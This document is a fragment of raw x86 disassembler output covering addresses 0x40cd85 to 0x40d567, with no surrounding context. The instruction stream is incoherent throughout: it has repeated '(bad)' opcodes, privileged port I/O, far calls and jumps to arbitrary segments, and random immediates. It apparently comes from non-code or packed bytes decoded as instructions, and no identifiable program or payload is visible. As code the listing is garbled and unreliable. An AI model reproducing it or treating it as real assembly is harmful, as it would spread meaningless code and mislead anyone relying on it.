  40cd85:	jmp    0x40cd5b
  40cd87:	sub    dl,BYTE PTR [edi]
  40cd89:	push   ebp
  40cd8a:	add    al,BYTE PTR [edi+esi*4-0x2a]
  40cd8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd8f:	data16 adc al,0x8
  40cd92:	xor    DWORD PTR [edi],0x37
  40cd95:	push   ss
  40cd96:	aas    
  40cd97:	xor    ah,BYTE PTR [edi-0x78eafa61]
  40cd9d:	xor    ebp,DWORD PTR [edi]
  40cd9f:	jae    0x40cd76
  40cda1:	dec    esi
  40cda2:	adc    dh,BYTE PTR [eax-0x65407fca]
  40cda8:	test   DWORD PTR ds:0x807b5562,ebx
  40cdae:	cli    
  40cdaf:	pop    ss
  40cdb0:	mov    eax,ds:0x26700b80
  40cdb5:	fnstenv [ebx+0x6ef81186]
  40cdbb:	push   cs
  40cdbc:	int3   
  40cdbd:	jmp    0x40ce19
  40cdbf:	aam    0x60
  40cdc1:	cmp    DWORD PTR [esi+0x5952d645],esp
  40cdc7:	xor    DWORD PTR [edi],edi
  40cdc9:	jg     0x40cd64
  40cdcb:	scas   eax,DWORD PTR es:[edi]
  40cdcc:	jo     0x40cdca
  40cdce:	jno    0x40ce07
  40cdd0:	add    BYTE PTR [edx+ebp*1],dh
  40cdd3:	sub    dh,cl
  40cdd5:	daa    
  40cdd6:	outs   dx,BYTE PTR ds:[esi]
  40cdd7:	loop   0x40ce12
  40cdd9:	dec    ebp
  40cdda:	jnp    0x40cdb6
  40cddc:	dec    edx
  40cddd:	cmc    
  40cdde:	sub    BYTE PTR [ebx],dl
  40cde0:	out    dx,al
  40cde1:	pop    ebx
  40cde2:	cmp    al,0xd5
  40cde4:	psllq  mm4,mm0
  40cde7:	in     al,dx
  40cde8:	je     0x40cdae
  40cdea:	jne    0x40ce31
  40cdec:	or     al,0x7a
  40cdee:	stos   BYTE PTR es:[edi],al
  40cdef:	push   esp
  40cdf0:	in     al,0xcd
  40cdf2:	lock push esi
  40cdf4:	inc    edi
  40cdf5:	test   eax,0xdb50d69d
  40cdfa:	(bad)  
  40cdfb:	loope  0x40ce47
  40cdfd:	imul   esi,DWORD PTR [ecx+0x48bd44a2],0xffffffdb
  40ce04:	adc    ebx,edx
  40ce06:	or     esp,DWORD PTR [esp+eax*8-0xb]
  40ce0a:	jbe    0x40cdea
  40ce0c:	and    ch,bh
  40ce0e:	jbe    0x40cda7
  40ce10:	mov    cl,0xd
  40ce12:	sahf   
  40ce13:	and    DWORD PTR [esi-0x653b1338],ebx
  40ce19:	mov    bl,0x45
  40ce1b:	mov    ch,0x77
  40ce1d:	push   esp
  40ce1e:	cmp    dh,al
  40ce20:	xchg   esi,eax
  40ce21:	imul   BYTE PTR [esi-0x40]
  40ce24:	lods   al,BYTE PTR ds:[esi]
  40ce25:	jge    0x40ce12
  40ce27:	mov    ds:0xb1d9394b,eax
  40ce2c:	neg    DWORD PTR [ecx+0x714ecfe0]
  40ce32:	outs   dx,DWORD PTR ds:[esi]
  40ce33:	push   ecx
  40ce34:	test   DWORD PTR [edi+0x243a1fb0],ecx
  40ce3a:	inc    di
  40ce3c:	imul   edi,DWORD PTR [ecx+0x6c],0xffffffa9
  40ce40:	daa    
  40ce41:	cmp    ch,BYTE PTR [ecx+0x61]
  40ce44:	je     0x40ce5b
  40ce46:	push   ebx
  40ce47:	dec    ebx
  40ce48:	or     edx,DWORD PTR [ecx+0x9]
  40ce4b:	lods   eax,DWORD PTR ds:[esi]
  40ce4c:	inc    ebx
  40ce4d:	retf   
  40ce4e:	jl     0x40ceac
  40ce50:	sub    BYTE PTR [edx],ah
  40ce52:	xor    BYTE PTR [eax+0x3e],dl
  40ce55:	sbb    DWORD PTR [edx+0x1e],eax
  40ce58:	cmp    dh,dh
  40ce5a:	cmp    ebx,DWORD PTR [edi+eiz*2]
  40ce5d:	jp     0x40cdff
  40ce5f:	(bad)  
  40ce60:	jne    0x40ce07
  40ce62:	lods   eax,DWORD PTR ds:[esi]
  40ce63:	out    dx,al
  40ce64:	cmp    BYTE PTR [edx],al
  40ce66:	pop    eax
  40ce67:	ret    
  40ce68:	mov    bh,0xd6
  40ce6a:	fcomp  QWORD PTR [edi]
  40ce6c:	cmp    al,0x31
  40ce6e:	cld    
  40ce6f:	out    dx,al
  40ce70:	aad    0xae
  40ce72:	xchg   DWORD PTR [ecx],ebx
  40ce74:	mov    esi,0x1f0832a5
  40ce79:	xor    eax,0xf5a03179
  40ce7e:	pop    ss
  40ce7f:	mul    BYTE PTR [ebp+0x5d235ad8]
  40ce85:	adc    eax,0x7baa65fc
  40ce8a:	cmp    BYTE PTR [ecx+0x28326e53],bl
  40ce90:	std    
  40ce91:	mov    ch,0xb1
  40ce93:	ror    BYTE PTR [ebx+0x3e45d5cf],1
  40ce99:	aam    0x96
  40ce9b:	retf   0x7da6
  40ce9e:	push   esi
  40ce9f:	fidiv  WORD PTR [eax]
  40cea1:	int    0x10
  40cea3:	ret    0x8d1d
  40cea6:	test   DWORD PTR [ebp+0x15e17658],esp
  40ceac:	inc    esp
  40cead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceaf:	ret    0x92da
  40ceb2:	test   DWORD PTR [eax+esi*4-0x1026df36],edx
  40ceb9:	ja     0x40cede
  40cebb:	test   BYTE PTR [ecx],cl
  40cebd:	push   ss
  40cebe:	aaa    
  40cebf:	popf   
  40cec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec1:	xor    edx,ebx
  40cec3:	aam    0x83
  40cec5:	loop   0x40cf20
  40cec7:	clc    
  40cec8:	mov    edi,ss
  40ceca:	xor    al,0xa5
  40cecc:	retf   
  40cecd:	and    ecx,DWORD PTR [ecx]
  40cecf:	sub    eax,0x46d4d8e7
  40ced4:	adc    al,0xb3
  40ced6:	xor    eax,0x448b1716
  40cedb:	ficomp WORD PTR [ecx-0x6e6950a5]
  40cee1:	cmp    al,0xae
  40cee3:	pop    eax
  40cee4:	mov    esi,0x36e51f3
  40cee9:	pop    ebx
  40ceea:	pop    ss
  40ceeb:	bound  eax,QWORD PTR [edi+0x1922e1b5]
  40cef1:	sti    
  40cef2:	or     DWORD PTR [esi-0x12fbc6d8],esi
  40cef8:	leave  
  40cef9:	push   ss
  40cefa:	inc    ebx
  40cefb:	outs   dx,BYTE PTR ds:[esi]
  40cefc:	frstor [eax+0x6bc46186]
  40cf02:	adc    eax,0x7d95deef
  40cf07:	xor    al,0xa9
  40cf09:	mov    WORD PTR [eax+0x52],fs
  40cf0c:	outs   dx,BYTE PTR ds:[esi]
  40cf0d:	or     eax,0x31ad371e
  40cf12:	ret    
  40cf13:	jmp    0x40cf3e
  40cf15:	das    
  40cf16:	call   0xb154:0x8bfca8a4
  40cf1d:	and    eax,0xaa6fd953
  40cf22:	cs xchg esi,eax
  40cf24:	inc    ebx
  40cf25:	mov    esp,0x27aac920
  40cf2a:	dec    esi
  40cf2b:	push   ss
  40cf2c:	sahf   
  40cf2d:	sti    
  40cf2e:	sub    ecx,eax
  40cf30:	mov    dh,0x75
  40cf32:	cmp    al,0x24
  40cf34:	sub    al,0x72
  40cf36:	mov    al,ds:0xf610f8fd
  40cf3b:	bound  esi,QWORD PTR [ebx+0x47c47bbd]
  40cf41:	dec    edx
  40cf42:	sbb    al,ah
  40cf44:	jg     0x40cf02
  40cf46:	vpsubd ymm2,ymm4,ymm5
  40cf4a:	dec    esi
  40cf4b:	repnz push 0x11abd395
  40cf51:	aad    0x58
  40cf53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf54:	mov    esi,eax
  40cf56:	mov    esi,edx
  40cf58:	retf   0xd0f8
  40cf5b:	pop    ebx
  40cf5c:	xor    bh,al
  40cf5e:	mov    esi,0xf2f4937d
  40cf63:	sub    eax,0xc5dccfb0
  40cf68:	pop    edx
  40cf69:	inc    esp
  40cf6a:	jmp    0xa59c6a97
  40cf6f:	xor    eax,0x3a3e0f96
  40cf74:	loopne 0x40cfa8
  40cf76:	enter  0x19b8,0x5c
  40cf7a:	push   ecx
  40cf7b:	jmp    0xa4d692b
  40cf80:	ret    0x508d
  40cf83:	adc    dh,bl
  40cf85:	cmp    eax,0x5e53c3fd
  40cf8a:	in     al,dx
  40cf8b:	dec    eax
  40cf8c:	stos   DWORD PTR es:[edi],eax
  40cf8d:	arpl   WORD PTR [edi-0x6f],bx
  40cf90:	mov    esi,0x3c82871c
  40cf95:	inc    edx
  40cf96:	inc    ecx
  40cf97:	ins    DWORD PTR es:[edi],dx
  40cf98:	jg     0x40cf39
  40cf9a:	mov    BYTE PTR [ebx-0x55],bh
  40cf9d:	cmp    BYTE PTR [ebp+0x6f],0xbf
  40cfa1:	push   ebp
  40cfa2:	inc    ecx
  40cfa3:	cli    
  40cfa4:	and    eax,DWORD PTR [ebp+0x4e]
  40cfa7:	call   0x51d526de
  40cfac:	out    0x57,eax
  40cfae:	cdq    
  40cfaf:	test   eax,0x32a88edb
  40cfb4:	sahf   
  40cfb5:	ins    DWORD PTR es:[edi],dx
  40cfb6:	jl     0x40cf7a
  40cfb8:	stc    
  40cfb9:	or     edi,DWORD PTR [ecx]
  40cfbb:	in     eax,dx
  40cfbc:	xor    DWORD PTR ds:0xddff,ebx
  40cfc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfc2:	stos   DWORD PTR es:[edi],eax
  40cfc3:	cmp    DWORD PTR [edi+0x2db0f73d],ebp
  40cfc9:	fwait
  40cfca:	jle    0x40cfe2
  40cfcc:	jg     0x40cf71
  40cfce:	jmp    FWORD PTR [edi-0x6087066d]
  40cfd4:	and    al,BYTE PTR [edi-0x1d]
  40cfd7:	mov    eax,0x5e223c92
  40cfdc:	ficom  DWORD PTR [ebp+0x7]
  40cfdf:	call   0xc2f6610b
  40cfe4:	mov    ebx,0xc8bca07c
  40cfe9:	add    dh,BYTE PTR [ecx+0x58]
  40cfec:	and    eax,0x7ccce183
  40cff1:	fcomip st,st(2)
  40cff3:	jl     0x40d068
  40cff5:	mov    al,0x36
  40cff7:	mov    eax,DWORD PTR [edx]
  40cff9:	and    eax,0xabc406aa
  40cffe:	xor    dl,BYTE PTR [ecx]
  40d000:	dec    edi
  40d001:	icebp  
  40d002:	jg     0x40d023
  40d004:	retf   
  40d005:	pop    ebx
  40d006:	aaa    
  40d007:	adc    eax,0xa80c8f90
  40d00c:	mov    ebx,0xb8a471fa
  40d011:	leave  
  40d012:	jmp    0xbd21:0x6d6000ec
  40d019:	das    
  40d01a:	and    eax,0xe2739c07
  40d01f:	pop    ecx
  40d020:	jb     0x40d096
  40d022:	clc    
  40d023:	iret   
  40d024:	push   eax
  40d025:	xor    cl,BYTE PTR [esi]
  40d027:	mov    ah,0xf5
  40d029:	fistp  WORD PTR ds:0xe31c43c9
  40d02f:	test   al,0xab
  40d031:	add    esi,DWORD PTR [esi+0x4567255d]
  40d037:	add    BYTE PTR [edi+0x25],al
  40d03a:	ins    BYTE PTR es:[edi],dx
  40d03b:	cmp    ebx,eax
  40d03d:	adc    cl,BYTE PTR [edi+0x4013cc15]
  40d043:	pop    es
  40d044:	mov    dl,0xe4
  40d046:	out    0x22,eax
  40d048:	lods   al,BYTE PTR ds:[esi]
  40d049:	push   ecx
  40d04a:	add    DWORD PTR [ecx-0x739e27f7],0x1c69a198
  40d054:	pop    ds
  40d055:	in     al,dx
  40d056:	dec    esi
  40d057:	test   eax,0xb22a8d47
  40d05c:	lock add eax,0x15e1711d
  40d062:	mov    esi,0x3488dedb
  40d067:	and    ah,al
  40d069:	add    eax,0xc9a15827
  40d06e:	sbb    BYTE PTR gs:[edx-0x5491864a],cl
  40d075:	loop   0x40d0f0
  40d077:	fild   DWORD PTR [ebx+0x1]
  40d07a:	ffree  st(7)
  40d07c:	mov    ebp,0xb76d007a
  40d081:	fcmovnbe st,st(1)
  40d083:	inc    edx
  40d084:	(bad)  
  40d085:	push   eax
  40d086:	ja     0x40d102
  40d088:	push   cs
  40d089:	gs stos BYTE PTR es:[edi],al
  40d08b:	or     cl,BYTE PTR [ebx]
  40d08d:	xchg   edi,eax
  40d08e:	inc    eax
  40d08f:	(bad)  
  40d090:	in     eax,dx
  40d091:	test   al,0x54
  40d093:	popf   
  40d094:	pop    ds
  40d095:	lods   al,BYTE PTR ds:[esi]
  40d096:	xchg   dl,al
  40d098:	call   0xf3412763
  40d09d:	pop    ebp
  40d09e:	jge    0x40d08f
  40d0a0:	daa    
  40d0a1:	fnsave [edi+0x197cdd27]
  40d0a7:	add    eax,0x237766eb
  40d0ac:	inc    esp
  40d0ad:	stos   BYTE PTR es:[edi],al
  40d0ae:	xor    DWORD PTR [ebp+0x12],ecx
  40d0b1:	outs   dx,BYTE PTR ds:[esi]
  40d0b2:	pop    edi
  40d0b3:	stc    
  40d0b4:	fcomp  DWORD PTR [edi+0x403c4fb6]
  40d0ba:	out    0xb,al
  40d0bc:	addr16 in al,0x75
  40d0bf:	mov    bl,ch
  40d0c1:	aad    0x5
  40d0c3:	sub    eax,0x7790181f
  40d0c8:	in     eax,dx
  40d0c9:	(bad)  
  40d0ca:	push   esi
  40d0cb:	mov    bl,BYTE PTR [edx+0x39a23f9f]
  40d0d1:	shl    BYTE PTR [esi+0x779598f6],cl
  40d0d7:	adc    DWORD PTR [eax-0x79],esi
  40d0da:	cmp    al,0x64
  40d0dc:	(bad)  
  40d0dd:	pop    esi
  40d0de:	clc    
  40d0df:	(bad)  
  40d0e0:	pop    ds
  40d0e1:	mov    al,BYTE PTR [edx-0x37]
  40d0e4:	clc    
  40d0e5:	sbb    BYTE PTR [ecx+0x52],dh
  40d0e8:	in     eax,dx
  40d0e9:	add    BYTE PTR [ebx],ch
  40d0eb:	adc    dl,bl
  40d0ed:	inc    ebx
  40d0ee:	imul   esp,DWORD PTR [ebx-0x3ab1e932],0xffffff95
  40d0f5:	sbb    DWORD PTR [edx+ecx*1+0x6e],ebx
  40d0f9:	pop    ds
  40d0fa:	pop    eax
  40d0fb:	lahf   
  40d0fc:	xor    BYTE PTR [ebp-0x2f],bh
  40d0ff:	enter  0x7085,0x2
  40d103:	pause  
  40d105:	inc    edx
  40d106:	call   0x49d:0x6b1df3aa
  40d10d:	sar    DWORD PTR [ecx+0x70],1
  40d110:	les    ecx,FWORD PTR [esi+edi*4-0x65]
  40d114:	pop    esp
  40d115:	mov    esp,0x58fc11d8
  40d11a:	pop    ebp
  40d11b:	mov    esi,eax
  40d11d:	xor    bl,BYTE PTR [esi-0x2e]
  40d120:	lock mov ebp,0x913f6ba5
  40d126:	das    
  40d127:	test   DWORD PTR [ebp+eiz*1-0x2607735e],0x9fe2f47f
  40d132:	mov    edx,0xc346ba61
  40d137:	push   edi
  40d138:	(bad)  
  40d139:	xchg   esi,eax
  40d13a:	je     0x40d1a4
  40d13c:	or     al,0x9e
  40d13e:	cli    
  40d13f:	sahf   
  40d140:	add    bl,ch
  40d142:	pop    esi
  40d143:	add    cl,bl
  40d145:	push   ebp
  40d146:	in     eax,0x97
  40d148:	sbb    BYTE PTR [ebx+0x30],ah
  40d14b:	and    DWORD PTR [edi-0x20],edx
  40d14e:	adc    eax,0x5cf9899b
  40d153:	rcl    DWORD PTR [eax+0x41],cl
  40d156:	sahf   
  40d157:	test   al,0x62
  40d159:	pusha  
  40d15a:	lds    ebp,FWORD PTR [ebx-0x5569e379]
  40d160:	or     al,0xef
  40d162:	add    edx,DWORD PTR [ebx]
  40d164:	xchg   BYTE PTR [ecx-0x1d6ad34a],ch
  40d16a:	out    0x41,eax
  40d16c:	mov    esp,0xd8d9d150
  40d171:	mov    eax,0xe7ab2786
  40d176:	fisttp QWORD PTR [edx-0x3f]
  40d179:	adc    ch,BYTE PTR [eax+edx*1-0x51a633bd]
  40d180:	cdq    
  40d181:	add    DWORD PTR [edx-0x1e],esp
  40d184:	scas   eax,DWORD PTR es:[edi]
  40d185:	cli    
  40d186:	jae    0x40d13a
  40d188:	xchg   edi,eax
  40d189:	sbb    al,0xea
  40d18b:	cli    
  40d18c:	pusha  
  40d18d:	out    0x50,al
  40d18f:	jge    0x40d1a1
  40d191:	push   edx
  40d192:	stc    
  40d193:	je     0x40d174
  40d195:	into   
  40d196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d197:	mov    cl,0xbd
  40d199:	(bad)  
  40d19b:	cmp    ch,dl
  40d19d:	dec    edi
  40d19e:	mov    edi,0x38f18f8a
  40d1a3:	push   edx
  40d1a4:	mov    esp,0x1d0616d9
  40d1a9:	add    DWORD PTR [edi-0x23924cae],ebp
  40d1af:	lock mov dl,0xcd
  40d1b2:	addr16 mov edi,0x694cd658
  40d1b8:	or     BYTE PTR [edx],bh
  40d1ba:	adc    ecx,DWORD PTR [ebx]
  40d1bc:	sub    dl,ah
  40d1be:	retf   
  40d1bf:	sub    eax,0xde36ad31
  40d1c4:	sbb    eax,0x9cedee1
  40d1c9:	ins    DWORD PTR es:[edi],dx
  40d1ca:	xor    esp,DWORD PTR [ebx]
  40d1cc:	outs   dx,BYTE PTR ds:[esi]
  40d1cd:	add    cl,BYTE PTR [edi+ecx*1+0x68559834]
  40d1d4:	out    dx,eax
  40d1d5:	pop    ss
  40d1d6:	out    0x69,eax
  40d1d8:	out    0xc,eax
  40d1da:	jne    0x40d1d9
  40d1dc:	inc    edi
  40d1dd:	lods   eax,DWORD PTR ds:[esi]
  40d1de:	imul   ebp,DWORD PTR [eax+0x1b],0x52
  40d1e2:	out    dx,eax
  40d1e3:	gs dec edx
  40d1e5:	and    BYTE PTR [ebp-0x375f0321],bh
  40d1eb:	aam    0x51
  40d1ed:	jbe    0x40d22e
  40d1ef:	or     DWORD PTR [eax+0xe],ebx
  40d1f2:	daa    
  40d1f3:	mov    al,ds:0xff2c409f
  40d1f8:	jecxz  0x40d230
  40d1fa:	xchg   ebp,eax
  40d1fb:	das    
  40d1fc:	mov    ebx,0xe7e6429e
  40d201:	push   0x78
  40d203:	js     0x40d204
  40d205:	ret    
  40d206:	inc    esp
  40d207:	dec    ebx
  40d208:	sub    al,0xc
  40d20a:	shl    DWORD PTR [ecx+0x5e],cl
  40d20d:	stos   BYTE PTR es:[edi],al
  40d20e:	mov    ecx,0x343b27ea
  40d213:	adc    al,0x54
  40d215:	push   edx
  40d216:	ffreep st(3)
  40d218:	lock es dec ecx
  40d21b:	jg     0x40d1ee
  40d21d:	adc    BYTE PTR [ebx],0xc0
  40d220:	or     ch,BYTE PTR [esi-0x3e]
  40d223:	xor    BYTE PTR [edx-0x715ad9eb],cl
  40d229:	(bad)  
  40d22a:	rcl    BYTE PTR [esi-0x6ca9b53],cl
  40d230:	nop
  40d231:	fs div bh
  40d234:	add    BYTE PTR [edx],cl
  40d236:	adc    edi,eax
  40d238:	clc    
  40d239:	push   edi
  40d23a:	mov    cl,0x46
  40d23c:	stos   DWORD PTR es:[edi],eax
  40d23d:	mov    dh,0x49
  40d23f:	test   DWORD PTR [eax+0x11a7796e],0x6911ad8e
  40d249:	cmp    BYTE PTR [ebp-0x7e11a843],ah
  40d24f:	push   esi
  40d250:	pop    ds
  40d251:	xchg   edi,eax
  40d252:	or     eax,0xdbc56d8c
  40d257:	popf   
  40d258:	jnp    0x40d297
  40d25a:	mov    esp,0xbf85710f
  40d25f:	fstp   st(7)
  40d261:	pop    ds
  40d262:	ds push ebx
  40d264:	shr    DWORD PTR [eax-0x219bb2b5],1
  40d26a:	xchg   ebp,eax
  40d26b:	rcr    ah,cl
  40d26d:	icebp  
  40d26e:	push   ecx
  40d26f:	ss int 0x34
  40d272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d273:	dec    ecx
  40d274:	cmp    ebx,DWORD PTR [edx]
  40d276:	jl     0x40d2d4
  40d278:	call   0xfaa0:0x193674bc
  40d27f:	lock popf 
  40d281:	jmp    FWORD PTR [esp+edi*1-0x1c]
  40d285:	xchg   edx,eax
  40d286:	jns    0x40d295
  40d288:	in     eax,dx
  40d289:	das    
  40d28a:	xchg   BYTE PTR [edx+esi*2+0x2e],dl
  40d28e:	and    eax,0xc1c5d1ec
  40d293:	call   0x6495:0xf15f0de1
  40d29a:	jbe    0x40d237
  40d29c:	and    DWORD PTR [ebx+edi*2+0x2e],0xffffffd7
  40d2a1:	gs inc esi
  40d2a3:	retf   0x7414
  40d2a6:	mov    dh,0x91
  40d2a8:	nop
  40d2a9:	repnz out 0xc1,eax
  40d2ac:	arpl   WORD PTR [eax],bx
  40d2ae:	rcr    DWORD PTR [ecx-0x434004af],cl
  40d2b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2b5:	pop    ss
  40d2b6:	in     al,dx
  40d2b7:	test   ebp,ebx
  40d2b9:	ins    DWORD PTR es:[edi],dx
  40d2ba:	cmp    bl,dl
  40d2bc:	(bad)  
  40d2bd:	lahf   
  40d2be:	gs and ah,ch
  40d2c1:	mov    bl,0x44
  40d2c3:	push   ss
  40d2c4:	rol    BYTE PTR [ebx+0x6e3c734f],0x65
  40d2cb:	fadd   DWORD PTR [eax+0x6fbeea79]
  40d2d1:	jo     0x40d2c7
  40d2d3:	(bad)  
  40d2d4:	imul   ebp,DWORD PTR [eax+0x1d],0xffffff8f
  40d2d8:	shr    BYTE PTR [esi],0x23
  40d2db:	dec    ebx
  40d2dc:	and    BYTE PTR [ebx],ah
  40d2de:	ror    DWORD PTR [ebx+0x77],cl
  40d2e1:	sub    dh,BYTE PTR [eax-0x62]
  40d2e4:	jns    0x40d33c
  40d2e6:	jnp    0x40d351
  40d2e8:	add    DWORD PTR [esi+ebx*1+0x701bbd99],edx
  40d2ef:	push   ebp
  40d2f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2f1:	mov    al,0x77
  40d2f3:	push   0x7d
  40d2f5:	dec    esp
  40d2f6:	ror    BYTE PTR [ebx],cl
  40d2f8:	jmp    0x6acaa63d
  40d2fd:	lahf   
  40d2fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2ff:	je     0x40d345
  40d301:	xor    eax,0xd932ce76
  40d306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d307:	dec    esi
  40d308:	out    0x2e,al
  40d30a:	aad    0x77
  40d30c:	jp     0x40d321
  40d30e:	je     0x40d2d7
  40d310:	jo     0x40d35e
  40d312:	bound  ebp,QWORD PTR [edi+0x11]
  40d315:	test   bh,bl
  40d317:	jbe    0x40d2e9
  40d319:	xchg   BYTE PTR [edi+0x5b],cl
  40d31c:	sub    BYTE PTR [ebx],bh
  40d31e:	cli    
  40d31f:	sub    eax,0x5b074954
  40d324:	repz xchg esp,eax
  40d326:	mov    eax,0x404a53f1
  40d32b:	and    esi,0xc624a8c
  40d331:	cmp    DWORD PTR [esi],0x31
  40d334:	and    DWORD PTR [eax-0x7a],ecx
  40d337:	out    dx,al
  40d338:	xchg   edi,eax
  40d339:	imul   ebx,DWORD PTR [ecx-0x9479d89],0xd2495bfd
  40d343:	mov    esi,0x85272487
  40d348:	jg     0x40d2ce
  40d34a:	pop    edx
  40d34b:	push   edi
  40d34c:	out    0xcc,eax
  40d34e:	fs add ch,al
  40d351:	sbb    ebp,0x52
  40d354:	inc    esi
  40d355:	or     al,0xc0
  40d357:	lock jmp 0x40d375
  40d35a:	test   al,0x70
  40d35c:	aad    0xee
  40d35e:	mov    ecx,0x839fd4ee
  40d363:	loop   0x40d3bc
  40d365:	adc    BYTE PTR [edx-0x49dcc763],dh
  40d36b:	shl    DWORD PTR [edx],1
  40d36d:	jo     0x40d315
  40d36f:	test   BYTE PTR [ebx-0x239fad4f],ah
  40d375:	dec    eax
  40d376:	int3   
  40d377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d378:	pop    ds
  40d379:	(bad)  
  40d37a:	adc    BYTE PTR [edi-0x7db7f7af],ch
  40d380:	or     DWORD PTR [edi],esi
  40d382:	push   ecx
  40d383:	mov    ds:0xf98e5e2f,al
  40d388:	sti    
  40d389:	sahf   
  40d38a:	lahf   
  40d38b:	dec    esi
  40d38c:	nop
  40d38d:	rcl    DWORD PTR [ecx+0x44],cl
  40d390:	push   edx
  40d391:	into   
  40d392:	adc    bl,BYTE PTR [ecx-0x58d4bbcc]
  40d398:	or     BYTE PTR [eax],bl
  40d39a:	cs inc edi
  40d39c:	cmp    al,0x2d
  40d39e:	aam    0xf5
  40d3a0:	jo     0x40d3b3
  40d3a2:	mov    eax,ds:0xfbbdc1aa
  40d3a7:	es jge 0x40d3c7
  40d3aa:	xlat   BYTE PTR ds:[ebx]
  40d3ab:	push   ss
  40d3ac:	push   ecx
  40d3ad:	sbb    cl,BYTE PTR [edx+ebx*4]
  40d3b0:	mov    esp,0x54bbd5ff
  40d3b5:	adc    esi,0xb5b75dce
  40d3bb:	stc    
  40d3bc:	and    ebp,edx
  40d3be:	xlat   BYTE PTR ds:[ebx]
  40d3bf:	jnp    0x40d406
  40d3c1:	stos   DWORD PTR es:[edi],eax
  40d3c2:	mov    eax,0xc44d9c
  40d3c7:	cmp    cl,BYTE PTR [eax+esi*8+0x333fa78c]
  40d3ce:	out    dx,eax
  40d3cf:	int    0xae
  40d3d1:	mov    ah,0xb9
  40d3d3:	or     BYTE PTR [ebx-0x2],bh
  40d3d6:	dec    ebp
  40d3d7:	rcl    DWORD PTR [ecx-0x12955e09],cl
  40d3dd:	dec    esi
  40d3de:	loopne 0x40d39a
  40d3e0:	xchg   esi,eax
  40d3e1:	mov    esi,0xbe7a43b6
  40d3e6:	cmp    al,0x9a
  40d3e8:	ret    0x9989
  40d3eb:	outs   dx,BYTE PTR ds:[esi]
  40d3ec:	out    dx,al
  40d3ed:	call   0xc06b:0xa3faa585
  40d3f4:	enter  0x6b51,0xc8
  40d3f8:	dec    edx
  40d3f9:	and    cl,ch
  40d3fb:	leave  
  40d3fc:	sub    ah,BYTE PTR [ebx+0x75045f8d]
  40d402:	out    dx,al
  40d403:	dec    ebp
  40d404:	imul   DWORD PTR [esp+edx*8-0x12]
  40d408:	dec    esp
  40d409:	(bad)  
  40d40b:	inc    esp
  40d40c:	jnp    0x40d3ad
  40d40e:	(bad)  
  40d40f:	mov    DWORD PTR [ebp+0xd724d5e],eax
  40d415:	sub    al,0xc4
  40d417:	jmp    0x1b96:0x8d8911c
  40d41e:	ret    0xf57b
  40d421:	js     0x40d3d2
  40d423:	sahf   
  40d424:	(bad)  
  40d425:	push   ecx
  40d426:	jb     0x40d422
  40d428:	mov    ds,WORD PTR [ecx]
  40d42a:	xchg   esi,eax
  40d42b:	push   0x24
  40d42d:	jmp    0x40d3dd
  40d42f:	(bad)  
  40d430:	lock jmp 0x80c1c01b
  40d436:	dec    eax
  40d437:	and    esp,DWORD PTR [ecx]
  40d439:	add    esi,ebp
  40d43b:	sbb    al,0xeb
  40d43d:	imul   eax,DWORD PTR [esi+0x48],0xb95c3b6f
  40d444:	jge    0x40d405
  40d446:	xor    al,0x19
  40d448:	stos   DWORD PTR es:[edi],eax
  40d449:	pop    edx
  40d44a:	push   eax
  40d44b:	stos   DWORD PTR es:[edi],eax
  40d44c:	mov    WORD PTR [edx],?
  40d44e:	jg     0x40d425
  40d450:	fisttp WORD PTR [edx-0x4b]
  40d453:	gs ins BYTE PTR es:[edi],dx
  40d455:	jge    0x40d4b1
  40d457:	(bad)  
  40d458:	es sahf 
  40d45a:	int3   
  40d45b:	popa   
  40d45c:	fbld   TBYTE PTR [esi]
  40d45e:	test   DWORD PTR [ecx-0x7b],esp
  40d461:	mov    ebx,0x641f398
  40d466:	add    DWORD PTR [ebx+0x78],edi
  40d469:	cmp    eax,0x4b1d5626
  40d46e:	scas   eax,DWORD PTR es:[edi]
  40d46f:	sbb    dl,BYTE PTR [eax+0x5c83c094]
  40d475:	inc    esp
  40d476:	cmp    BYTE PTR [edx],0x1f
  40d479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d47a:	jmp    DWORD PTR [ecx+0x7e]
  40d47d:	es xchg esi,eax
  40d47f:	adc    esp,DWORD PTR [ecx]
  40d481:	lds    ebp,FWORD PTR [eax+0x419e39dc]
  40d487:	jmp    0x602716e8
  40d48c:	outs   dx,BYTE PTR ds:[esi]
  40d48e:	mov    ds:0xc2b9c914,eax
  40d493:	stos   DWORD PTR es:[edi],eax
  40d494:	add    ch,BYTE PTR [ebx+0xdf]
	...
  40d512:	add    BYTE PTR [eax],al
  40d514:	adc    BYTE PTR [eax-0x20006009],bh
  40d51a:	js     0x40d4db
  40d51c:	shl    BYTE PTR [ebx-0x5e],cl
  40d51f:	mov    ds:0xd67de7b8,al
  40d524:	aad    0x83
  40d526:	add    BYTE PTR [eax],al
  40d528:	imul   eax,DWORD PTR [edi],0x0
  40d52b:	add    ch,dh
  40d52d:	jg     0x40d4bd
  40d52f:	retf   0x2ccf
  40d532:	fstp   QWORD PTR [edx-0x48ca0613]
  40d538:	add    ebx,edx
  40d53a:	ja     0x40d4dc
  40d53c:	and    dh,BYTE PTR [edi]
  40d53e:	loope  0x40d540
  40d540:	inc    ecx
  40d541:	hlt    
  40d542:	cmp    al,0x56
  40d544:	ds xor cl,BYTE PTR cs:[edi-0x353b605e]
  40d54c:	loopne 0x40d527
  40d54e:	push   ebp
  40d54f:	add    edi,0xedf76bb
  40d555:	retf   0x9d10
  40d558:	out    0x62,eax
  40d55a:	(bad)  
  40d55b:	pop    ecx
  40d55c:	int3   
  40d55d:	ror    BYTE PTR [ecx],cl
  40d55f:	push   cs
  40d560:	jp     0x40d52e
  40d562:	and    DWORD PTR [ecx+0x52],esp
  40d565:	in     al,0x0
  40d567:	jne    0x40d5c1
